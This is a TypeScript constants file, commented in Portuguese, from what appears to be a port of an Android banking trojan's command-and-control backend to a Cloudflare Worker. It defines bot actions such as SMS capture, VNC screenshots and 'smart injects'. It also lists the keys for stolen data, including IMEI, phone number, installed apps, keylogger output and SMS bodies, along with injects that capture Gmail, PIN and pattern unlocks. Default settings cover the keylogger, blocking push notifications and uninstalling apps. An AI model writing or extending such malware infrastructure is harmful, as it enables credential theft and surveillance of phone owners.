// api/src/shared/constants.ts
// Cloudflare Worker – constantes extraídas dos arquivos PHP (config.php, bot_api.php, smarts.class.php)

// ----------------------------------------------------------------------
// Flag de debug (config.php)
// ----------------------------------------------------------------------
export const DEBUG = false;

// ----------------------------------------------------------------------
// Ações possíveis (valores padrão 1 a 6 – ajuste conforme o original)
// ----------------------------------------------------------------------
export const P_ACTION_REGISTER = 1;
export const P_ACTION_PING = 2;
export const P_ACTION_SMS = 3;
export const P_ACTION_VNC_SCREENSHOT = 4;
export const P_ACTION_SMART_INJECT = 5;
export const P_ACTION_SMART_SAVE = 6;

// ----------------------------------------------------------------------
// Parâmetros dos dados enviados pelo bot (chaves usadas no JSON)
// ----------------------------------------------------------------------
export const P_BOT_ID = 'bI';
export const P_TAG = 'lB';
export const P_IS_DEVICE_ADMIN = 'dA';
export const P_IS_LOCKED = 'lK';
export const P_IS_SMS_ADMIN = 'iA';
export const P_ACTION = 'xc';
export const P_IMEI = 'imei';
export const P_NUMBER = 'number';
export const P_COUNTRY = 'country';
export const P_LANG = 'lang';
export const P_ANDROID = 'android';
export const P_MODEL = 'model';
export const P_OPERATOR = 'operator';
export const P_INSTALLED_APPS = 'apps';
export const P_UPTIME = 'up';
export const P_VNC = 'vnc';
export const P_IS_LOADER_INSTALLED = 'iL';
export const P_REAL_IP = 'rIP';
export const P_INFO_ACSB = 'iAc';
export const P_INFO_PUSH = 'iPa';
export const P_INFO_BATTERY = 'iBC';
export const P_INFO_CHARGER = 'iCP';
export const P_INFO_SCREEN = 'iSE';
export const P_IS_GO = 'iAg';
export const P_INFO_SUPRESSED = 'iSp';
export const P_INFO_PERMS_FAILED = 'iFp';
export const P_LOCAL_TIMESTAMP = 'cTsk';
export const P_TASK = 'task';
export const P_KEYLOGGER = 'kL';
export const P_SMART_PKG = 'sPK';
export const P_SMART_DATA = 'spD';
export const P_SMART_FILLED = 'sF';
export const P_ADDRESS = 'sA';
export const P_BODY = 'sB';
export const P_TIME = 'sT';
export const P_VNC_FILENAME = 'fn';
export const P_VNC_SCREENSHOT_BYTES = 'bs';
export const P_TASKS_RESULTS = 'tasks_results'; // corrigido: não conflita com P_LOCAL_TIMESTAMP

// ----------------------------------------------------------------------
// Listas especiais (injets padrão e status)
// ----------------------------------------------------------------------
export const SPECIAL_INJECTS: string[] = ['gmail', 'pattern', 'pin'];

export const SPECIAL_STATUSES: Record<string, string> = {
  gmail: 'By command',
  pattern: 'By command',
  pin: 'By command',
  acsb: 'Automatically',
};

// ----------------------------------------------------------------------
// Configurações padrão (podem ser sobrescritas pelo banco de dados)
// ----------------------------------------------------------------------
export const DEFAULT_CONFIG: Record<string, string> = {
  keylogger_enabled: '0',
  smarts_ver: '0',
  domains_bot: '',
  block_push_apps: '',
  minimize_apps: '',
  uninstall_apps: '',
  block_push_delay: '0',
  minimize_delay: '0',
  uninstall_delay: '120',
  get_device_admin_delay: '0',
  keylogger_delay: '0',
  injects_delay: '120',
  net_delay: '60',
};